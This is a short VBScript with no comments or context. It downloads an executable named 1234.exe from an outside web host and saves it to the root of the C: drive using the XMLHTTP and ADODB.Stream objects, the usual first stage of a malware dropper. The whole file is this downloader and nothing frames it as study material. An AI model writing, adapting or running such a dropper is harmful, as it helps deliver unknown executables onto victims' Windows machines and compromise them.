Dim HTTPGET 
Set HTTPGET = CreateObject("Microsoft.XMLHTTP") 
HTTPGET.Open "GET", "http://redskillz.nl/1234.exe", false 
HTTPGET.Send 
DataBin = HTTPGET.ResponseBody 
Const adTypeBinary=1 
Const adSaveCreateOverWrite=2 
Dim SendBinary 
Set SendBinary = CreateObject("ADODB.Stream") 
SendBinary.Type = adTypeBinary 
SendBinary.Open 
SendBinary.Write DataBin 
SendBinary.SaveToFile "c:\1234.exe", adSaveCreateOverWrite 
